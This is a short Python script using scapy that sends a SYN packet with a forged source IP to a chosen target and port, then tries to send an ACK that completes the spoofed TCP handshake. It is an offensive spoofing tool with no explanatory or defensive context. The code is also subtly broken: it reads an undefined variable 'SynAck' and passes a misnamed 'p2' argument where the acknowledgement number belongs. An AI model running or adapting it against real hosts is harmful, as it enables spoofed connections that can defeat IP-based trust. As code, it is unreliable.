#!/usr/bin/env python
import sys
from scapy.all import *
       
if len(sys.argv) != 6:
    print("Usage: ./spoof.py <target> <tport> <spoofed_ip> <sport> <iface>")
    sys.exit(1)
                           
target = sys.argv[1]
tport = int(sys.argv[2])
spoofed_ip = sys.argv[3]
spport = int(sys.argv[4])
iface = sys.argv[5]       
                                    
p1=IP(dst=target,src=spoofed_ip)
syn=TCP(dport=tport,sport=spport,seq=8888,flags='S')
Ack= srp1(Ether()/p1/syn, iface=iface)
                                            
p2=TCP(dport=tport,sport=spport,flags='A',seq=SynAck.ack, p2=Ack.seq + 1)
send(Ether()/p1/p2, iface=iface)
                                     